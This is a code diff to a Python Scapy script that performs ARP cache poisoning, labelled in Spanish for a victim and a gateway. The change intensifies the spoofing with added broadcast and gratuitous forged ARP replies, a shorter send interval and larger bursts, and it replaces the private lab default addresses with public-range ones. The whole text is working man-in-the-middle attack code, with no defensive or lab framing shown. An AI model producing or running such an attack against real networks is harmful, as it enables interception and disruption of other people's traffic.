@@ -152,7 +152,9 @@ def restore_sysctl(old_values):
             write_sysctl(path, value)
 
 def poison_once(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_mac):
-    packet_to_target = (
+    packets = []
+
+    packet_to_target_unicast = (
         Ether(src=attacker_mac, dst=target_mac) /
         ARP(
             op=2,
@@ -163,7 +165,29 @@ def poison_once(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_
         )
     )
 
-    packet_to_gateway = (
+    packet_to_target_broadcast = (
+        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
+        ARP(
+            op=2,
+            psrc=gateway_ip,
+            hwsrc=attacker_mac,
+            pdst=target_ip,
+            hwdst="ff:ff:ff:ff:ff:ff"
+        )
+    )
+
+    packet_to_target_gratuitous = (
+        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
+        ARP(
+            op=2,
+            psrc=gateway_ip,
+            hwsrc=attacker_mac,
+            pdst=gateway_ip,
+            hwdst="ff:ff:ff:ff:ff:ff"
+        )
+    )
+
+    packet_to_gateway_unicast = (
         Ether(src=attacker_mac, dst=gateway_mac) /
         ARP(
             op=2,
@@ -174,8 +198,38 @@ def poison_once(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_
         )
     )
 
-    sendp(packet_to_target, iface=iface, verbose=False)
-    sendp(packet_to_gateway, iface=iface, verbose=False)
+    packet_to_gateway_broadcast = (
+        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
+        ARP(
+            op=2,
+            psrc=target_ip,
+            hwsrc=attacker_mac,
+            pdst=gateway_ip,
+            hwdst="ff:ff:ff:ff:ff:ff"
+        )
+    )
+
+    packet_to_gateway_gratuitous = (
+        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
+        ARP(
+            op=2,
+            psrc=target_ip,
+            hwsrc=attacker_mac,
+            pdst=target_ip,
+            hwdst="ff:ff:ff:ff:ff:ff"
+        )
+    )
+
+    packets.extend([
+        packet_to_target_unicast,
+        packet_to_target_broadcast,
+        packet_to_target_gratuitous,
+        packet_to_gateway_unicast,
+        packet_to_gateway_broadcast,
+        packet_to_gateway_gratuitous
+    ])
+
+    sendp(packets, iface=iface, verbose=False)
 
 def poison_burst(iface, attacker_mac, target_ip, target_mac, gateway_ip, gateway_mac, burst):
     for _ in range(burst):
@@ -229,8 +283,8 @@ def main():
     parser.add_argument("-i", "--iface", default=None)
     parser.add_argument("-t", "--target", default=None)
     parser.add_argument("-g", "--gateway", default=None)
-    parser.add_argument("--interval", type=float, default=0.15)
-    parser.add_argument("--burst", type=int, default=10)
+    parser.add_argument("--interval", type=float, default=0.05)
+    parser.add_argument("--burst", type=int, default=20)
     parser.add_argument("--duration", type=int, default=0)
     parser.add_argument("--restore-count", type=int, default=10)
     parser.add_argument("--no-restore", action="store_true")
@@ -251,10 +305,10 @@ def main():
         sys.exit(1)
 
     if args.target is None:
-        args.target = ask_ip("IP de la víctima", "192.168.58.2")
+        args.target = ask_ip("IP de la víctima", "20.25.8.47")
 
     if args.gateway is None:
-        args.gateway = ask_ip("IP del gateway", "192.168.58.1")
+        args.gateway = ask_ip("IP del gateway", "20.25.8.45")
 
     if not valid_ip(args.target):
         print(f"IP víctima inválida: {args.target}")
@@ -344,7 +398,7 @@ def main():
             now = time.time()
 
             if now - last >= 2:
-                packets = rounds * args.burst * 2
+                packets = rounds * args.burst * 6
                 elapsed = now - start
                 pps = packets / max(elapsed, 0.001)
 
